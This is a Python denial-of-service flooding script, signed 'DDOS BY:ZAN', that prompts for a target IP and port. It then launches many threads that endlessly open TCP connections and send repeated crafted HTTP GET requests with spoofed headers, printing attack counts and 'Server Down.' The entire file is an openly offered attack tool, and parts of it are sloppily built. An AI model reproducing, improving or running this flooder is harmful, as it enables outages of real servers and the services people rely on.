import threading
import socket, requests
import random
userip = ["""45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443"""]
acceptall = [""" https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com """]
print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
              |  LAYER4  |  TIME:LIFETIME |
              |  LAYER7  |   TCP:443/80   |
              |   TCP    |      UDP:17091    |
              |   UDP    |
              """)
ip = str(input("IP ATTACK>="))
port = int(input("PORT >= "))
pack = int(input("[ ? ] how long do you want Packet/s >="))
th = int(input("[ ? ] how long do you want Thread/t >="))
def start():
  global userip
  hh = random._urandom(999999)
  xx = int(0)
  ipser = "IP: "+random.choice(userip)+"\r\n"
  accept = random.choice(acceptall)+"\r\n"
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_req = ipser + content + length + target_host + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
            print('[+] Server Down.')

for x in range(th):
    thred = threading.Thread(target=start)
    thred.start()
